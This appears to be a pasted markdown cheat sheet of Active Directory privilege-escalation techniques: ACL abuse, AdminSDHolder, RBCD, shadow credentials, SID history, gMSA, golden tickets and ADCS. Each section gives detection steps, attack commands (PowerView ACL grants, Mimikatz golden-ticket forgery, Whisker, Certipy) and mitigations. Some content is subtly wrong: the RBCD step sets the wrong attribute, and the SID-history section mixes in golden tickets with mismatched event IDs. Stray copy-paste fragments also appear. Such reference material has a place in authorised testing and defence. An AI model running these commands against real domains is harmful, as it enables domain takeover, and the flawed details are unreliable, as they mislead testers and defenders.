<details>
<summary> DACL/ACL-Based Escalation (GenericAll / WriteDACL / WriteProperty)</summary>
 <br> 

If you (or a compromised account) have ACL rights like GenericAll, WriteDACL, or WriteProperty over another AD object (user, group, OU, computer), you can modify permissions or credentials to escalate privileges 

🔍 Detection

Use BloodHound to detect privileged edges (WriteDacl, GenericAll).

Run PowerView:

powershell

    Get-ObjectAcl -SamAccountName TargetUser -ResolveGUIDs
Filter for rights: GenericAll, WriteDacl, etc. 

⚙️ Exploitation
Use PowerView/Powermad:

powershell

    Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "LowPrivUser" -Rights All
Then add yourself to Domain Admins or reset passwords.

🛡️ Mitigation

Audit ACLs on sensitive objects (adminCount=1).

Use BloodHound to regularly review privileged rights.

Limit ACEs granting WriteDACL or GenericAll.
</details>
<details>
<summary>AdminSDHolder Abuse</summary>
 <br>  
The AdminSDHolder object enforces consistent ACLs on protected groups (like Domain Admins). If you can alter its ACL, the change propagates via SDProp to all members 

🔍 Detection
Search for AdminSDHolder ACLs:

powershell

    Get-ADUser -LDAPFilter "(AdminCount=1)" ...
    Get-ACL "AD:CN=AdminSDHolder,CN=System,DC=domain,DC=com"
⚙️ Exploitation

powershell

    Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,...' -PrincipalSamAccountName attacker -Rights All
You’ll gain long-term privileged membership.

🛡️ Mitigation

Restrict ACL modifications on AdminSDHolder.

Monitor event logs for changes (event IDs 4662, 4670).
</details>
<details>
<summary>Resource-Based Constrained Delegation (RBCD) Abuse</summary>
 <br> 

Control over a computer object plus delegation rights can allow you to impersonate users to services—escalating to SYSTEM or DC-level access via Kerberos ticket forging.

🔍 Detection
Use BloodHound to detect AllowedToDelegateTo paths. Query with:

powershell

    Get-ADComputer -Properties msDS-AllowedToDelegateTo
⚙️ Exploitation
Create a computer account (e.g. attacker$) and set delegation rights:

powershell

    Set-ADComputer target$ -Add @{msDS-AllowedToDelegateTo='attacker$'}
Then issue Kerberos tickets with Rubeus or Impacket.

🛡️ Mitigation

Limit delegation rights.

Audit msDS-AllowedToDelegateTo attributes.

Disable unconstrained delegation unless required.
</details>
<details>
<summary>Shadow Credentials</summary>
 <br> 

If you can write to the msDS-KeyCredentialLink attribute on an object, you can create a "shadow credential" (certificate) to authenticate as them via Kerberos PKINIT without needing passwords 
HADESS

🔍 Detection
Check write permissions on this attribute via BloodHound or PowerView:

powershell

    Get-ACL object | Select-Object rights
⚙️ Exploitation
Use Whisker.exe:

powershell

    Whisker.exe add /target:CompAccount$
Then obtain TGT via certificate-based authentication with Rubeus.

🛡️ Mitigation

Disable unnecessary write access to msDS-KeyCredentialLink.

Monitor certificate enrollment events.

Enforce Windows ≥2016 with Kerberos protections.
</details>
<details>
<summary>SID History Injection</summary>
 <br> 

If you can modify SIDHistory (or have KRBTGT hash), you can inject high-privilege SIDs into your account and forge golden tickets for domain admin access.

🔍 Detection
Check SIDHistory values via ADSI or BloodHound.

⚙️ Exploitation
Use Mimikatz:

powershell

    kerberos::golden /user:attacker /sid:<DA_SID> 
Forge TGT tickets to escalate.

🛡️ Mitigation

Monitor creation of unusual tickets or SIDHistory changes (Event ID 4720/4732).

Secure KRBTGT hash with frequent password resets.
</details>
<details>
<summary>Trust Exploitation / Foreign Security Principals Abuse</summary>
 <br>
 Trust Exploitation / Foreign Security Principals Abuse

In multi-domain or multi-forest environments, trust misconfigurations allow abused FSP entries from other realms to escalate via cross-domain ACLs.

🔍 Detection
BloodHound shows trust paths and unresolved SIDs.

⚙️ Exploitation
Add FSP SID from trusted domain into a privileged group using ACL editing.

🛡️ Mitigation

Enable SID filtering.

Validate cross-domain ACLs for resolved accounts only.
</details>
<details>
<summary>gMSA Password Disclosure</summary>
 <br>
 gMSA Password Disclosure

If you can read msDS-ManagedPassword, you can retrieve the machine account password of a Group Managed Service Account to impersonate it.

🔍 Detection
Check ACL on gMSA:

powershell

    Get-ADServiceAccount gmsa -Properties msDS-ManagedPassword
ConvertFrom-ADManagedPasswordBlob ...
⚙️ Exploitation
With ReadGMSAPassword rights, extract credentials via PowerShell (ConvertFrom-ADManagedPasswordBlob).

🛡️ Mitigation

Restrict read ACLs for these attributes.

Monitor gMSA password retrieval events.
</details>
<details>
<summary>Golden Ticket Forgery (KRBTGT compromise)</summary>
 <br>
If you can extract KRBTGT NTLM hash (e.g. via DCSync), you can issue valid TGTs for any domain user—including Domain Admins—without contacting KDC.

🔍 Detection
Monitor long-lifetime TGT events (Event ID 4768) or hash extraction attempts.

⚙️ Exploitation
Use Mimikatz:

powershell

    kerberos::golden /user:Administrator /krbtgt:<hash> /domain:domain.com
Inject ticket with /ptt.

🛡️ Mitigation

Periodically reset KRBTGT twice.

Monitor DCSync and TGT creation anomalies.
</details>
<details>
<summary> ADCS Misconfiguration / ESC Attacks</summary>
 <br>

Abusing Certificate Templates or CA permissions can allow low-privilege users to enroll certs for high-risk purposes (e.g. escrow, domain authentication), leading to full domain compromise 

🔍 Detection

Use certipy, bloodhound or certify to enumerate templates and CA ACLs.

Check for templates that allow enrollment to Authenticated Users.

⚙️ Exploitation
Certipy or PowerView:

powershell
Copy
Edit
Certipy find
Certipy enroll attacker -template vulnerableTemplate
Use resulting certificate to authenticate via PKINIT.

🛡️ Mitigation

Secure template ACLs (use principle of least privilege).

Require CA manager approval for templates.

Monitor certificate issuance logs.

